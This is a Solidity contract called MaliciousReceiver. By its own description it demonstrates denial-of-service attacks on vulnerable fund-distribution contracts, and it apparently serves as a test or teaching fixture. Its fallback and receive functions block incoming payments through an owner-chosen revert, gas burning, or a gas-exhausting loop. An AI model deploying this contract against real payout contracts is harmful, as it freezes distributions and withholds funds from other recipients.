// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title MaliciousReceiver
 * @dev Contract that demonstrates DoS attacks on vulnerable distribution contracts
 * @notice This contract can execute different attack modes:
 * 1. REVERT - Simply reverts on receiving funds
 * 2. GAS_BURN - Consumes excessive gas to cause distribution failure
 * 3. LOOP - Executes an infinite loop to consume all gas
 */
contract MaliciousReceiver {
    enum AttackMode {
        NONE,
        REVERT,
        GAS_BURN,
        LOOP
    }
    
    AttackMode public attackMode;
    address public owner;
    uint256 public receivedCount;
    uint256 public totalReceived;
    
    event AttackModeChanged(AttackMode newMode);
    event PaymentReceived(uint256 amount);
    event AttackExecuted(AttackMode mode);
    
    constructor() {
        owner = msg.sender;
        attackMode = AttackMode.NONE;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner");
        _;
    }
    
    /**
     * @dev Set the attack mode
     */
    function setAttackMode(AttackMode _mode) external onlyOwner {
        attackMode = _mode;
        emit AttackModeChanged(_mode);
    }
    
    /**
     * @dev Malicious fallback function that can execute different attacks
     */
    fallback() external payable {
        _executeAttack();
    }
    
    receive() external payable {
        _executeAttack();
    }
    
    /**
     * @dev Internal function to execute the selected attack
     */
    function _executeAttack() internal {
        if (attackMode == AttackMode.NONE) {
            // Normal behavior - accept payment
            receivedCount++;
            totalReceived += msg.value;
            emit PaymentReceived(msg.value);
            return;
        }
        
        emit AttackExecuted(attackMode);
        
        if (attackMode == AttackMode.REVERT) {
            // Attack 1: Simple revert to block distribution
            revert("Malicious revert - blocking distribution");
        } else if (attackMode == AttackMode.GAS_BURN) {
            // Attack 2: Burn gas by doing expensive operations
            _burnGas();
            revert("Gas burned - distribution will fail");
        } else if (attackMode == AttackMode.LOOP) {
            // Attack 3: Infinite loop (or very long loop)
            _infiniteLoop();
        }
    }
    
    /**
     * @dev Burns gas by performing expensive storage operations
     */
    function _burnGas() internal {
        // Perform expensive storage writes to consume gas
        for (uint256 i = 0; i < 100; i++) {
            receivedCount = i;
        }
    }
    
    /**
     * @dev Executes a very long loop to consume all available gas
     */
    function _infiniteLoop() internal {
        uint256 dummy = 0;
        // This will consume all remaining gas
        while (gasleft() > 2300) {
            dummy++;
        }
        revert("Loop consumed all gas");
    }
    
    /**
     * @dev Withdraw accumulated funds (when in NONE mode)
     */
    function withdraw() external onlyOwner {
        payable(owner).transfer(address(this).balance);
    }
    
    /**
     * @dev Get contract balance
     */
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
